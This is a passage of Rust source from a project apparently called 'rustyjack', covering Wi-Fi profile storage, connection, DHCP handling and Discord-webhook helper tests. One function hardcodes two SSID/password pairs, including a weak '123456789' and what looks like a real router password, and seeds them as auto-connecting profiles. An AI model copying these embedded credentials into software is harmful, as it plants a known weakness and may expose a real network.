pub fn load_wifi_profile(root: &Path, identifier: &str) -> Result<Option<StoredWifiProfile>> {
    let dir = wifi_profiles_dir(root);
    if !dir.exists() {
        tracing::warn!(
            target: "wifi",
            path = %dir.display(),
            "wifi_profiles_directory_missing"
        );
        return Ok(None);
    }

    let identifier_lower = identifier.trim().to_lowercase();
    tracing::info!(
        target: "wifi",
        identifier = %identifier,
        "wifi_profile_lookup_start"
    );

    // Try direct filename match first (case-insensitive), support .json and .json.enc
    let sanitized = sanitize_profile_name(identifier);
    let direct_plain = dir.join(format!("{sanitized}.json"));
    let direct_enc = dir.join(format!("{sanitized}.json.enc"));

    for candidate in [&direct_plain, &direct_enc] {
        if candidate.exists() {
            tracing::info!(
                target: "wifi",
                path = %candidate.display(),
                "wifi_profile_direct_match"
            );
            let contents = if candidate.extension().and_then(|s| s.to_str()) == Some("enc") {
                let mut bytes = rustyjack_encryption::decrypt_file(candidate)
                    .with_context(|| format!("decrypting profile {}", candidate.display()))?;
                let mut s = String::from_utf8(bytes.clone())
                    .with_context(|| format!("utf8 profile {}", candidate.display()))?;
                let out = s.clone();
                s.zeroize();
                bytes.zeroize();
                out
            } else {
                let mut s = fs::read_to_string(candidate)
                    .with_context(|| format!("reading profile from {}", candidate.display()))?;
                let out = s.clone();
                s.zeroize();
                out
            };
            let profile = serde_json::from_str::<WifiProfile>(&contents)
                .with_context(|| format!("parsing profile from {}", candidate.display()))?;
            return Ok(Some(StoredWifiProfile {
                profile,
                path: candidate.to_path_buf(),
            }));
        }
    }

    // Search all profiles for case-insensitive SSID match
    tracing::info!(target: "wifi", "wifi_profile_direct_match_missing");
    for entry in fs::read_dir(&dir)
        .with_context(|| format!("reading profiles directory {}", dir.display()))?
    {
        let entry = entry.with_context(|| "reading directory entry")?;
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        let ext = path.extension().and_then(|s| s.to_str());
        if ext != Some("json") && ext != Some("enc") {
            continue;
        }

        let contents = if ext == Some("enc") {
            match rustyjack_encryption::decrypt_file(&path) {
                Ok(mut bytes) => {
                    let out = match String::from_utf8(bytes.clone()) {
                        Ok(mut s) => {
                            let copy = s.clone();
                            s.zeroize();
                            copy
                        }
                        Err(e) => {
                            tracing::warn!(
                                target: "wifi",
                                path = %path.display(),
                                error = %e,
                                "wifi_profile_parse_failed"
                            );
                            bytes.zeroize();
                            continue;
                        }
                    };
                    bytes.zeroize();
                    out
                }
                Err(e) => {
                    tracing::warn!(
                        target: "wifi",
                        path = %path.display(),
                        error = %e,
                        "wifi_profile_decrypt_failed"
                    );
                    continue;
                }
            }
        } else {
            match fs::read_to_string(&path) {
                Ok(mut c) => {
                    let out = c.clone();
                    c.zeroize();
                    out
                }
                Err(e) => {
                    tracing::warn!(
                        target: "wifi",
                        path = %path.display(),
                        error = %e,
                        "wifi_profile_read_failed"
                    );
                    continue;
                }
            }
        };

        let profile = match serde_json::from_str::<WifiProfile>(&contents) {
            Ok(p) => p,
            Err(e) => {
                tracing::warn!(
                    target: "wifi",
                    path = %path.display(),
                    error = %e,
                    "wifi_profile_parse_failed"
                );
                continue;
            }
        };

        // Case-insensitive comparison
        if profile.ssid.trim().to_lowercase() == identifier_lower {
            tracing::info!(
                target: "wifi",
                path = %path.display(),
                "wifi_profile_ssid_match"
            );
            return Ok(Some(StoredWifiProfile { profile, path }));
        }
    }

    tracing::info!(
        target: "wifi",
        identifier = %identifier,
        "wifi_profile_not_found"
    );
    Ok(None)
}

pub fn ensure_default_wifi_profiles(root: &Path) -> Result<usize> {
    let defaults = [("rustyjack", "123456789"), ("SKYHN7XM", "6HekvGQvxuVV")];

    let mut created = 0usize;
    for (ssid, password) in defaults {
        match load_wifi_profile(root, ssid) {
            Ok(Some(_)) => continue,
            Ok(None) => {}
            Err(err) => {
                tracing::warn!(
                    target: "wifi",
                    ssid = %ssid,
                    error = %err,
                    "wifi_profile_check_failed"
                );
                continue;
            }
        }

        let profile = WifiProfile {
            ssid: ssid.to_string(),
            password: Some(password.to_string()),
            interface: "auto".to_string(),
            priority: 1,
            auto_connect: true,
            created: None,
            last_used: None,
            notes: Some("Preloaded WiFi profile".to_string()),
        };

        match save_wifi_profile(root, &profile) {
            Ok(path) => {
                tracing::info!(
                    target: "wifi",
                    ssid = %ssid,
                    path = %path.display(),
                    "wifi_profile_seeded"
                );
                created += 1;
            }
            Err(err) => {
                tracing::warn!(
                    target: "wifi",
                    ssid = %ssid,
                    error = %err,
                    "wifi_profile_seed_failed"
                );
            }
        }
    }

    Ok(created)
}

pub fn save_wifi_profile(root: &Path, profile: &WifiProfile) -> Result<PathBuf> {
    // Validate profile before saving
    if profile.ssid.trim().is_empty() {
        bail!("Cannot save profile: SSID cannot be empty");
    }

    if profile.ssid.len() > 32 {
        bail!("Cannot save profile: SSID too long (max 32 characters)");
    }

    // Validate interface name
    let interface = profile.interface.trim();
    if !interface.is_empty() && interface != "auto" {
        let valid_chars = interface
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-');
        if !valid_chars {
            bail!("Cannot save profile: Invalid interface name '{interface}'");
        }
    }

    tracing::info!(
        target: "wifi",
        ssid = %profile.ssid,
        "wifi_profile_save_start"
    );

    let dir = wifi_profiles_dir(root);
    fs::create_dir_all(&dir)
        .with_context(|| format!("creating WiFi profiles directory at {}", dir.display()))?;
    harden_dir_permissions(&dir);

    let mut to_save = profile.clone();
    let now = Local::now().to_rfc3339();
    if to_save.created.is_none() {
        to_save.created = Some(now.clone());
    }
    to_save.last_used = Some(now);

    let sanitized = sanitize_profile_name(&to_save.ssid);
    let encrypt_profiles = rustyjack_encryption::wifi_profile_encryption_active();
    if encrypt_profiles && !rustyjack_encryption::encryption_enabled() {
        bail!("WiFi profile encryption is enabled but no key is loaded");
    }

    let filename = if encrypt_profiles {
        format!("{sanitized}.json.enc")
    } else {
        format!("{sanitized}.json")
    };
    let path = dir.join(filename);

    // Remove legacy copy with the opposite extension to prevent stale duplicates
    let legacy = if encrypt_profiles {
        dir.join(format!("{sanitized}.json"))
    } else {
        dir.join(format!("{sanitized}.json.enc"))
    };
    if legacy.exists() {
        let _ = fs::remove_file(&legacy);
    }

    tracing::info!(
        target: "wifi",
        path = %path.display(),
        "wifi_profile_write_start"
    );
    write_wifi_profile(&path, &to_save)
        .with_context(|| format!("writing WiFi profile to {}", path.display()))?;

    tracing::info!(target: "wifi", "wifi_profile_save_complete");
    Ok(path)
}

pub fn delete_wifi_profile(root: &Path, identifier: &str) -> Result<()> {
    let dir = wifi_profiles_dir(root);
    if !dir.exists() {
        tracing::error!(
            target: "wifi",
            path = %dir.display(),
            "wifi_profile_dir_missing"
        );
        bail!("Profile directory missing at {}", dir.display());
    }

    let identifier_lower = identifier.trim().to_lowercase();
    tracing::info!(
        target: "wifi",
        identifier = %identifier,
        "wifi_profile_delete_start"
    );

    // Try direct filename match first (plain or encrypted)
    let sanitized = sanitize_profile_name(identifier);
    let direct_plain = dir.join(format!("{sanitized}.json"));
    let direct_enc = dir.join(format!("{sanitized}.json.enc"));
    for candidate in [&direct_plain, &direct_enc] {
        if candidate.exists() {
            tracing::info!(
                target: "wifi",
                path = %candidate.display(),
                "wifi_profile_delete_direct"
            );
            fs::remove_file(candidate)
                .with_context(|| format!("deleting profile at {}", candidate.display()))?;
            tracing::info!(target: "wifi", "wifi_profile_delete_complete");
            return Ok(());
        }
    }

    // Search for case-insensitive match
    tracing::info!(target: "wifi", "wifi_profile_delete_search");
    for entry in fs::read_dir(&dir)
        .with_context(|| format!("reading profiles directory {}", dir.display()))?
    {
        let entry = entry.with_context(|| "reading directory entry")?;
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        let ext = path.extension().and_then(|s| s.to_str());
        if ext != Some("json") && ext != Some("enc") {
            continue;
        }

        let contents = if ext == Some("enc") {
            match rustyjack_encryption::decrypt_file(&path) {
                Ok(mut bytes) => {
                    let out = match String::from_utf8(bytes.clone()) {
                        Ok(mut s) => {
                            let copy = s.clone();
                            s.zeroize();
                            copy
                        }
                        Err(e) => {
                            tracing::warn!(
                                target: "wifi",
                                path = %path.display(),
                                error = %e,
                                "wifi_profile_parse_failed"
                            );
                            bytes.zeroize();
                            continue;
                        }
                    };
                    bytes.zeroize();
                    out
                }
                Err(e) => {
                    tracing::warn!(
                        target: "wifi",
                        path = %path.display(),
                        error = %e,
                        "wifi_profile_decrypt_failed"
                    );
                    continue;
                }
            }
        } else {
            match fs::read_to_string(&path) {
                Ok(mut c) => {
                    let out = c.clone();
                    c.zeroize();
                    out
                }
                Err(e) => {
                    tracing::warn!(
                        target: "wifi",
                        path = %path.display(),
                        error = %e,
                        "wifi_profile_read_failed"
                    );
                    continue;
                }
            }
        };

        let profile = match serde_json::from_str::<WifiProfile>(&contents) {
            Ok(p) => p,
            Err(e) => {
                tracing::warn!(
                    target: "wifi",
                    path = %path.display(),
                    error = %e,
                    "wifi_profile_parse_failed"
                );
                continue;
            }
        };

        if profile.ssid.trim().to_lowercase() == identifier_lower {
            tracing::info!(
                target: "wifi",
                path = %path.display(),
                "wifi_profile_delete_match"
            );
            fs::remove_file(&path)
                .with_context(|| format!("deleting profile at {}", path.display()))?;
            tracing::info!(target: "wifi", "wifi_profile_delete_complete");
            return Ok(());
        }
    }

    tracing::error!(
        target: "wifi",
        identifier = %identifier,
        "wifi_profile_not_found"
    );
    bail!("Profile '{identifier}' not found")
}

pub fn write_wifi_profile(path: &Path, profile: &WifiProfile) -> Result<()> {
    let mut json = serde_json::to_string_pretty(profile)?;
    let encrypt_profiles = path
        .extension()
        .and_then(|e| e.to_str())
        .map(|ext| ext.eq_ignore_ascii_case("enc"))
        .unwrap_or(false)
        || rustyjack_encryption::wifi_profile_encryption_active();

    if encrypt_profiles {
        if !rustyjack_encryption::encryption_enabled() {
            json.zeroize();
            bail!("WiFi profile encryption active but no key loaded");
        }
        let data = rustyjack_encryption::encrypt_bytes(json.as_bytes())?;
        write_private_file(path, &data)?;
    } else {
        write_private_file(path, json.as_bytes())?;
    }
    json.zeroize();
    Ok(())
}

pub(crate) fn wifi_backend_from_env() -> StationBackendKind {
    match env::var("RUSTYJACK_WIFI_BACKEND")
        .ok()
        .map(|v| v.trim().to_lowercase())
        .as_deref()
    {
        Some("dbus") | Some("wpa_dbus") | Some("supplicant_dbus") | Some("wpa_supplicant_dbus") => {
            StationBackendKind::WpaSupplicantDbus
        }
        Some("external") | Some("wpa") | Some("wpa_supplicant") => {
            StationBackendKind::WpaSupplicantDbus
        }
        Some("rust_open") | Some("open") => StationBackendKind::RustOpen,
        Some("rust_wpa2") | Some("wpa2") => StationBackendKind::RustWpa2,
        _ => StationBackendKind::WpaSupplicantDbus,
    }
}

#[tracing::instrument(target = "wifi", skip(password), fields(iface = %interface, ssid = %ssid))]
pub fn connect_wifi_network(interface: &str, ssid: &str, password: Option<&str>) -> Result<()> {
    connect_wifi_network_with_cancel(interface, ssid, password, None)
}

#[tracing::instrument(target = "wifi", skip(password), fields(iface = %interface, ssid = %ssid))]
pub fn connect_wifi_network_with_cancel(
    interface: &str,
    ssid: &str,
    password: Option<&str>,
    cancel: Option<&CancelFlag>,
) -> Result<()> {
    // Check permissions first
    check_network_permissions()?;
    check_cancel(cancel)?;

    // Validate inputs
    if ssid.trim().is_empty() {
        bail!("SSID cannot be empty");
    }
    if interface.trim().is_empty() {
        bail!("Interface name cannot be empty");
    }
    if !interface_exists(interface) {
        bail!("Interface {} does not exist", interface);
    }
    if !is_wireless_interface(interface) {
        bail!("Interface {} is not a wireless device", interface);
    }

    check_cancel(cancel)?;

    tracing::info!(
        target: "wifi",
        iface = %interface,
        ssid = %ssid,
        "wifi_connect_start"
    );

    log_wifi_preflight(interface);

    let rt = crate::runtime::shared_runtime()
        .with_context(|| "Failed to use tokio runtime for WiFi connect")?;

    let mut backend = wifi_backend_from_env();
    tracing::info!(target: "wifi", backend = ?backend, "wifi_backend_selected");

    // Release DHCP lease
    if let Err(e) = rt.block_on(async { rustyjack_netlink::dhcp_release(interface).await }) {
        tracing::warn!(
            target: "net",
            iface = %interface,
            error = %e,
            "dhcp_release_failed"
        );
    }
    cancel_sleep(cancel, std::time::Duration::from_millis(100))?;

    // Reset interface: down, flush, set to station, then up
    tracing::info!(
        target: "wifi",
        iface = %interface,
        "wifi_interface_reset"
    );
    netlink_set_interface_down(interface)
        .with_context(|| format!("bringing interface {interface} down"))?;
    cancel_sleep(cancel, std::time::Duration::from_millis(200))?;
    if let Err(e) = rt.block_on(async { rustyjack_netlink::flush_addresses(interface).await }) {
        tracing::warn!(
            target: "net",
            iface = %interface,
            error = %e,
            "flush_addresses_failed"
        );
    }
    check_cancel(cancel)?;
    {
        let mut wm =
            WirelessManager::new().map_err(|e| anyhow!("Failed to open nl80211 socket: {}", e))?;
        if let Err(e) = wm.set_mode(interface, InterfaceMode::Station) {
            tracing::warn!(
                target: "wifi",
                iface = %interface,
                error = %e,
                "wifi_station_mode_set_failed"
            );
        }
    }
    netlink_set_interface_up(interface)
        .with_context(|| format!("bringing interface {interface} up"))?;
    cancel_sleep(cancel, std::time::Duration::from_millis(300))?;

    // Keep the interface managed entirely in-process (no NetworkManager dependency).

    let mut station = match StationManager::new_with_backend(interface, backend) {
        Ok(station) => station,
        Err(err) if backend == StationBackendKind::WpaSupplicantDbus => {
            tracing::warn!(
                target: "wifi",
                error = %err,
                "wpa_supplicant_dbus_unavailable_fallback"
            );
            backend = StationBackendKind::RustWpa2;
            tracing::info!(target: "wifi", backend = ?backend, "wifi_backend_selected_fallback");
            StationManager::new_with_backend(interface, backend)
                .with_context(|| "Failed to initialize RustWpa2 fallback backend")?
        }
        Err(err) => {
            return Err(anyhow!(err))
                .with_context(|| format!("Failed to initialize WiFi backend {:?}", backend));
        }
    };

    if let Err(err) = station.ensure_ready() {
        if backend == StationBackendKind::WpaSupplicantDbus {
            tracing::warn!(
                target: "wifi",
                error = %err,
                "wpa_supplicant_dbus_unavailable_fallback"
            );
            backend = StationBackendKind::RustWpa2;
            tracing::info!(target: "wifi", backend = ?backend, "wifi_backend_selected_fallback");
            station = StationManager::new_with_backend(interface, backend)
                .with_context(|| "Failed to initialize RustWpa2 fallback backend")?;
        } else {
            return Err(anyhow!(err))
                .with_context(|| format!("Failed to initialize WiFi backend {:?}", backend));
        }
    }
    let password = password
        .map(|p| p.trim())
        .filter(|p| !p.is_empty())
        .map(|p| p.to_string());
    let station_cfg = StationConfig {
        ssid: ssid.to_string(),
        password,
        force_scan_ssid: true,
        ..StationConfig::default()
    };

    check_cancel(cancel)?;
    let outcome = station
        .connect(&station_cfg)
        .with_context(|| format!("Failed to connect to {} via supplicant", ssid))?;
    tracing::info!(
        target: "wifi",
        state = ?outcome.final_state,
        bssid = ?outcome.selected_bssid,
        freq = ?outcome.selected_freq,
        attempts = outcome.attempts,
        scan_ssid = outcome.used_scan_ssid,
        "wifi_station_connected"
    );

    tracing::info!(target: "wifi", "wifi_wpa_connected_dhcp_start");

    // Request DHCP lease with retry
    let mut dhcp_success = false;
    let mut last_error: Option<String> = None;
    for attempt in 1..=3 {
        check_cancel(cancel)?;
        match acquire_dhcp_lease(interface)? {
            DhcpAttemptResult::Lease(lease) => {
                dhcp_success = true;
                tracing::info!(
                    target: "net",
                    attempt = attempt,
                    address = %lease.ip,
                    prefix_len = lease.prefix_len,
                    gateway = ?lease.gateway,
                    "dhcp_lease_acquired"
                );
                break;
            }
            DhcpAttemptResult::Failed(err) => {
                last_error = Some(err.clone());
                tracing::warn!(
                    target: "net",
                    attempt = attempt,
                    error = %err,
                    "dhcp_attempt_failed"
                );
            }
            DhcpAttemptResult::Busy => {
                tracing::debug!(
                    target: "net",
                    attempt = attempt,
                    "dhcp_attempt_skipped_lock_busy"
                );
            }
        }

        if attempt < 3 {
            cancel_sleep(cancel, std::time::Duration::from_secs(2))?;
        }
    }

    if dhcp_success {
        let _ = select_active_uplink();
    } else {
        let reason = last_error.unwrap_or_else(|| "no DHCP lease acquired".to_string());
        bail!("DHCP lease acquisition failed: {}", reason);
    }

    tracing::info!(target: "wifi", ssid = %ssid, "wifi_connect_complete");
    Ok(())
}

pub fn disconnect_wifi_interface(interface: Option<String>) -> Result<String> {
    check_network_permissions()?;

    let iface = if let Some(iface) = interface {
        iface
    } else {
        auto_detect_wifi_interface()?.ok_or_else(|| {
            tracing::error!(target: "wifi", "wifi_disconnect_no_interface");
            anyhow!("No Wi-Fi interface to disconnect")
        })?
    };

    let span = tracing::info_span!(target: "wifi", "wifi_disconnect", iface = %iface);
    let _guard = span.enter();
    tracing::info!(target: "wifi", iface = %iface, "wifi_disconnect_start");

    let _rt = crate::runtime::shared_runtime()
        .with_context(|| "Failed to use tokio runtime for disconnect")?;
    let mut backend = wifi_backend_from_env();
    match rustyjack_netlink::station_disconnect_with_backend(&iface, backend) {
        Ok(()) => {}
        Err(e) if backend == StationBackendKind::WpaSupplicantDbus => {
            tracing::warn!(
                target: "wifi",
                iface = %iface,
                error = %e,
                "wifi_disconnect_dbus_unavailable_fallback"
            );
            backend = StationBackendKind::RustWpa2;
            rustyjack_netlink::station_disconnect_with_backend(&iface, backend).map_err(|err| {
                tracing::error!(
                    target: "wifi",
                    iface = %iface,
                    error = %err,
                    "wifi_disconnect_failed"
                );
                anyhow!("Failed to disconnect {iface}: {err}")
            })?;
        }
        Err(e) => {
            tracing::error!(
                target: "wifi",
                iface = %iface,
                error = %e,
                "wifi_disconnect_failed"
            );
            bail!("Failed to disconnect {iface}: {e}");
        }
    }

    tracing::info!(target: "net", iface = %iface, "dhcp_release_start");
    let rt = crate::runtime::shared_runtime()
        .with_context(|| "Failed to use tokio runtime for DHCP release")?;
    if let Err(e) = rt.block_on(async { rustyjack_netlink::dhcp_release(&iface).await }) {
        tracing::warn!(
            target: "net",
            iface = %iface,
            error = %e,
            "dhcp_release_failed"
        );
    }

    tracing::info!(target: "wifi", iface = %iface, "wifi_disconnect_complete");
    Ok(iface)
}

fn check_network_permissions() -> Result<()> {
    // Check if running as root or with necessary capabilities
    // libc::geteuid is available on Unix only; guard with conditional compilation so
    // this crate can still build on non-Unix hosts (CI, dev machines, editor tooling).
    #[cfg(unix)]
    {
        let euid = unsafe { libc::geteuid() };
        if euid != 0 {
            tracing::error!(
                target: "net",
                euid = euid,
                "network_permissions_missing"
            );
            bail!("Network operations require root privileges. Please run as root or with sudo.");
        }
    }

    // On non-Unix platforms the permission check is a no-op — the runtime environment
    // (or platform-specific APIs) should enforce required permissions instead.
    Ok(())
}

/// Cleanup function for graceful WiFi operation failures
/// Attempts to restore interface to a working state after errors
pub fn cleanup_wifi_interface(interface: &str) -> Result<()> {
    tracing::info!(
        target: "wifi",
        iface = %interface,
        "wifi_cleanup_start"
    );

    // Release DHCP if any
    let rt = crate::runtime::shared_runtime()
        .with_context(|| "Failed to use tokio runtime for cleanup DHCP release")?;
    if let Err(e) = rt.block_on(async { rustyjack_netlink::dhcp_release(interface).await }) {
        tracing::warn!(
            target: "net",
            iface = %interface,
            error = %e,
            "dhcp_release_cleanup_failed"
        );
    }

    // Ensure interface is up
    let _ = netlink_set_interface_up(interface);

    tracing::info!(
        target: "wifi",
        iface = %interface,
        "wifi_cleanup_complete"
    );
    Ok(())
}

fn auto_detect_wifi_interface() -> Result<Option<String>> {
    let summaries = list_interface_summaries()?;
    if let Some(active) = summaries
        .iter()
        .find(|s| s.kind == "wireless" && s.ip.is_some())
    {
        return Ok(Some(active.name.clone()));
    }
    Ok(summaries
        .iter()
        .find(|s| s.kind == "wireless")
        .map(|s| s.name.clone()))
}

pub fn read_wifi_link_info(interface: &str) -> WifiLinkInfo {
    let mut info = WifiLinkInfo::default();
    info.connected = interface_has_carrier(interface) || interface_has_ipv4(interface);
    info.ssid = None;
    info.signal_dbm = read_wireless_signal_dbm(interface);
    info
}

fn read_wireless_signal_dbm(interface: &str) -> Option<i32> {
    let contents = std::fs::read_to_string("/proc/net/wireless").ok()?;
    for line in contents.lines().skip(2) {
        let trimmed = line.trim_start();
        if !trimmed.starts_with(interface) {
            continue;
        }
        let mut parts = trimmed.split_whitespace();
        let _iface = parts.next()?;
        let _status = parts.next()?;
        let _link = parts.next()?;
        let level = parts.next()?;
        let level = level.trim_end_matches('.');
        if let Ok(value) = level.parse::<f32>() {
            return Some(value as i32);
        }
    }
    None
}

fn wifi_profiles_dir(root: &Path) -> PathBuf {
    root.join("wifi").join("profiles")
}

fn harden_dir_permissions(path: &Path) {
    #[cfg(unix)]
    {
        let _ = fs::set_permissions(path, fs::Permissions::from_mode(0o700));
    }
}

fn write_private_file(path: &Path, data: &[u8]) -> Result<()> {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)?;
        harden_dir_permissions(parent);
    }

    let mut options = fs::OpenOptions::new();
    options.create(true).write(true).truncate(true);
    #[cfg(unix)]
    {
        options.mode(0o600);
    }

    let mut file = options
        .open(path)
        .with_context(|| format!("opening {}", path.display()))?;
    use std::io::Write;
    file.write_all(data)
        .with_context(|| format!("writing {}", path.display()))?;

    #[cfg(unix)]
    {
        let _ = fs::set_permissions(path, fs::Permissions::from_mode(0o600));
    }

    Ok(())
}

fn sanitize_profile_name(input: &str) -> String {
    let mut sanitized = String::new();
    for ch in input.chars() {
        if ch.is_ascii_alphanumeric() {
            sanitized.push(ch.to_ascii_lowercase());
        } else if ch.is_whitespace() || ch == '-' || ch == '_' {
            if !sanitized.ends_with('_') {
                sanitized.push('_');
            }
        }
    }
    let trimmed = sanitized.trim_matches('_').to_string();
    if trimmed.is_empty() {
        "profile".to_string()
    } else {
        trimmed
    }
}

#[cfg(test)]
mod discord_tests {
    use super::*;

    #[test]
    fn test_redact_webhook_url() {
        let url = "https://discord.com/api/webhooks/123456789/AbCdEfGhIjKlMnOpQrStUvWxYz_0123";
        let redacted = redact_webhook_url(url);
        assert_eq!(
            redacted,
            "https://discord.com/api/webhooks/[REDACTED]"
        );
        assert!(!redacted.contains("123456789"));
        assert!(!redacted.contains("AbCdEfGhIjKlMnOpQrStUvWxYz"));
    }

    #[test]
    fn test_redact_webhook_url_in_error_message() {
        let msg = "Failed to send to https://discord.com/api/webhooks/9999/SECRET_TOKEN_HERE: timeout";
        let redacted = redact_webhook_url(msg);
        assert!(redacted.contains("[REDACTED]"));
        assert!(!redacted.contains("SECRET_TOKEN_HERE"));
        assert!(redacted.contains("timeout"));
    }

    #[test]
    fn test_discord_error_snippet_truncates() {
        let body = "x".repeat(DISCORD_DIAG_MAX_BYTES + 1000);
        let snippet = discord_error_snippet(&body);
        assert!(snippet.len() <= DISCORD_DIAG_MAX_BYTES);
    }

    #[test]
    fn test_discord_error_snippet_redacts() {
        let body = r#"{"message": "failed", "url": "https://discord.com/api/webhooks/123/TOKEN"}"#;
        let snippet = discord_error_snippet(&body);
        assert!(snippet.contains("[REDACTED]"));
        assert!(!snippet.contains("TOKEN"));
    }

    #[test]
    fn test_discord_status_is_fatal() {
        assert!(discord_status_is_fatal(400));
        assert!(discord_status_is_fatal(401));
        assert!(discord_status_is_fatal(403));
        assert!(discord_status_is_fatal(404));
        assert!(discord_status_is_fatal(413));
        assert!(!discord_status_is_fatal(429));
        assert!(!discord_status_is_fatal(500));
        assert!(!discord_status_is_fatal(502));
        assert!(!discord_status_is_fatal(200));
    }

    #[test]
    fn test_parse_retry_after_from_header() {
        let mut headers = reqwest::header::HeaderMap::new();
        headers.insert("retry-after", "3.5".parse().unwrap());
        let duration = parse_retry_after(&headers, "{}");
        // ceil(3.5) = 4, +1 jitter = 5
        assert_eq!(duration, Duration::from_secs(5));
    }

    #[test]
    fn test_parse_retry_after_from_json_body() {
        let headers = reqwest::header::HeaderMap::new();
        let body = r#"{"retry_after": 2.1, "message": "rate limited"}"#;
        let duration = parse_retry_after(&headers, body);
        // ceil(2.1) = 3, +1 jitter = 4
        assert_eq!(duration, Duration::from_secs(4));
    }

    #[test]
    fn test_parse_retry_after_fallback() {
        let headers = reqwest::header::HeaderMap::new();
        let body = "not json";
        let duration = parse_retry_after(&headers, body);
        assert_eq!(duration, Duration::from_secs(5));
    }

    #[test]
    fn test_multipart_field_naming() {
        // Verify that our format string produces correct Discord field names
        for i in 0..15 {
            let field_name = format!("files[{}]", i);
            assert!(field_name.starts_with("files["));
            assert!(field_name.ends_with("]"));
        }
    }
}
